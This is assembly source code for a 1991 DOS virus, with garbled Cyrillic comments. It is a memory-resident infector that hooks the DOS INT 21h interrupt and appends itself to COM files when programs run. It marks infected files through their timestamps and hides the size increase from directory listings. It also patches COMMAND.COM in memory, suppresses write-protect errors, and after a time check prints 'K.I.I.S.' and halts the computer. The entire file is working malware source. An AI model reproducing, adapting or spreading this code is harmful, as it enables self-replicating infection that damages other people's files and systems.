
;************************************************************************;
;*               T��� Virus � �������� �� 25.10.1991 �. �               *;
;*                                                                      *;
;*              �� " ��. ������� �������� " � 17:18.30 hour             *;
;*                                                                      *;
;*                           ���� 316 �� �.�.�.                         *;
;************************************************************************;

start:  jmp     short begin
	db	(00h)
	db	(53h)		; �� ������������ �� ������
	db	(4bh)		; ���� ����� � �������
	int	20h
okey:	db	(0b8h)
	db	(03h)
	db	(00h)
	db	(0cdh)
	db	(10h)

begin:	push	cx									;
	CALL	F1									;
F1:	POP	SI									; �� �������������� �� ������� 5 �����
	SUB	SI,09								;
	PUSH	SI			;
        cld                         ;
	mov	di,100h ;
	mov	cx,5		;
	rep	movsb		;
	jmp	ding2

new21:  pushf                       ; CALL ��� ������������ INT 21h ��
        push    cs                  ; IBMDOS.COM - � ��� �� �� �� ���-
        call    Word ptr cs:[8c0h]  ; ��� ����� �������� �� ������
        ret                         ; ���� Anti4us.exe, NDD � �.�.

int21h: STI
        cmp     ah,4bh              ; ��� ���������� �� ����
	jz	mm                  ;
        cmp     ah,11h              ; ��� ������� �� ����� � ����� ����
        jz      home                ; � ��� ��� DIR �� ������ ������.
        cmp     ah,12h              ;
        jz      home
        jmp     int1hh

home:   call    new21               ; ��������� ���� ��� DIR ���������
        push    ax                  ; ���� ���� � 10:26 � ,��� � �����
        push    bx                  ; ����� � ������� � ������� �������-
	push	es                  ; �� �� ������ �� �� �� ���������
																		; ������������� �� �����.
        mov     ah,2fh              ; ����� DTA � ES:BX . ���� � � bx+1eh
        call    new21               ; ��� � 10:26 ;
        mov     ax,534bh
        cmp     Word ptr es:[bx+1eh],ax
        jnz     ox
	mov     ax,End-Okey+3
        sub     Word ptr es:[bx+24h],ax
ox:     pop     es                  ; ��� �� � 10:26 , �� ����� �����
	pop     bx                  ; ����� � ���� �� ������ ���� �
	pop     ax                  ; ������������ ������� ��� ���-
	db	(0CAh)        			; ������ �� ������ � ������.
        dw      (2)

   ;****************************************************;
   ;*                 � � � � � � � � � �              *;
   ;****************************************************;

mm:	pushf
        PUSH    AX
	PUSH	BX
	PUSH	CX
	PUSH	DX
	PUSH	DS
	PUSH	ES
	PUSH	SI
	PUSH	DI
        xor     ax,ax
        mov     ds,ax
        mov     di,[0194h]
        mov     es,[0196h]
        mov     ax,[004ch]
        mov     bx,[004eh]
        mov     cx,0f000h
        mov     dx,0ec59h
        mov     [0100h],dx
        mov     [0102h],cx
        mov     [0198h],ax
        mov     [019ah],bx
        mov     [004ch],di
        mov     [004eh],es
	mov	ax,0a15h+new24-begin
        push    cs
        pop     ds
	push	cs
	pop	es
	mov	ah,2ch
	call	new21
	cmp	cx,0200h
	jna	mm1
	mov	ax,0003h
	int	10h
	mov	ah,09h
	mov	dx,0a15h+n-begin
	call	new21
	cli
	hlt

dinge:  jmp     ding

mm1:	mov	ah,2fh		;Dos service function ah=2FH (get DTA)
        call    new21
        mov     cs:[8b0h],es
        mov     cs:[8b2h],bx
        MOV     AH,4eH
        MOV     DX,0a10h+files-okey
	mov	cx,0
        call    new21
        jc      dinge           ;CX  File attribute
                                ;DS:DX Pointer of filespec (ASCIIZ string)
vir:	mov	ax,534bh
	cmp	es:[bx+16h],ax
	jnz	fuck
vir1:	mov	ah,4fh
	call	new21
	jc	enzi
	jmp	short vir
enzi:	jmp	ding
fuck:	mov	cx,1500
	cmp	es:[bx+1ah],cx
	jna	vir1
fuck1:	push	es
	pop	ds
	mov	ax,3d02h
	mov	dx,bx
	add	dx,1eh
        call    new21
        mov     cs:[0a10h+handle-okey],ax
        mov     bx,ax
	push	cs
	pop	ds
	mov	ah,3fh
	mov	dx,0a10h
	mov	cx,5
        call    new21
        mov     di,0a10h+end-okey
	mov	al,0e9h
	mov	[di],al
	inc	di
	mov	bx,[8b2h]
	mov	cx,es:[bx+1ah]
	inc	cx
	inc	cx
	mov	[di],cx
	inc	di
	inc	di
        mov     ax,534bh
	mov	[di],ax
	mov	bx,cs:[0a10h+handle-okey]
	mov	ax,4200h
	xor	cx,cx
	xor	dx,dx
	call	new21
	mov	ah,40h
	mov	dx,0a10h+end-okey
	mov	cx,5
        call    new21
	mov	ax,4202h
	xor	cx,cx
	xor	dx,dx
        call    new21
	push	cs
	pop	ds
	mov	bx,cs:[0a10h+handle-okey]
	mov	ah,40h
	mov	dx,0a10h
	mov	cx,end-okey-3
        call    new21
	mov	bx,cs:[0a10h+handle-okey]
        mov     ax,5700h
        call    new21
        mov     ax,5701h
        mov     cx,534bh
        call    new21
        mov     ah,3eh
        call    new21
ding:   xor     ax,ax
        mov     ds,ax
        mov     ax,[0198h]
        mov     bx,[019ah]
        mov     [004ch],ax
        mov     [004eh],bx
        POP     DI
	POP	SI
        POP     ES
	POP	DS
	POP	DX
	POP	CX
	POP	BX
	POP	AX
	popf

int1hh: jmp     word ptr cs:[8c0h]  ; ���������� 21�

files:	db	'*.com',0		; �������� ���� COM �������

new24:  mov     al,03               ; Int 24h �� �� ���� Write Protect
	iret

ding2:  MOV     AX,0070h            ; ����� � ������ 0070h: � ���������
        MOV     ES,AX               ; �� ������������ ������� �� INT13H
        MOV     DI,0000h
        MOV     AX,80FBh
non1:   CLD
        MOV     CX,0FFFFh
non2:   REPNZ   SCASW
        JZ      non
        MOV     DI,0001h
        JMP     non1
non:    MOV     BX,02FCh
        CMP     ES:[DI],BX
        JNZ     non2
        DEC     DI
        DEC     DI
        xor     ax,ax               ; ������� ������ ���������� INT13H �
        mov     ds,ax               ; � �� �������� �� ������
        mov     [0194h],di
        mov     [0196h],es
	mov	es,[009eh]
	mov	bx,[00a0h]
        push    cs
        pop     ds
        MOV     BP,DS
        pop     si
        push    si                  ; ��������� ������ � ����� ��
        MOV     DI,0a10h            ; COMMAND.COM
        MOV     CX,Handle-Okey      ; � ���� ���� � ��������
        REP     MOVSB               ; ������ ����� �� �� ������
        PUSH    ES                  ; � ������ � Int 21h
        LEA     DI,[BX+1bh]
        MOV     AL,0e9h
        STOSB
        MOV     AX,0A30h
        SUB     AX,DI
        STOSW
	MOV	AX,9090H
        STOSW
        STOSW
        MOV     ES:[8c0h],DI
        MOV     AX,SS
        SUB     AX,0018h
        CLI
        MOV     SS,AX
        STI
        MOV     DS,BP
        POP     ES
        pop     si
        pop     cx
        xor     ax,ax
        xor     bx,bx
        xor     dx,dx
        xor     si,si
	mov	di,100h
        push    di
        xor     di,di
        ret
n:      db      "K.I.I.S.� ",024h   ; ���� ���� �� ��������� ���� 2 ����.
handle: dw      ?                   ; � ���� ���� ������� ���������.
end:    db      (00)
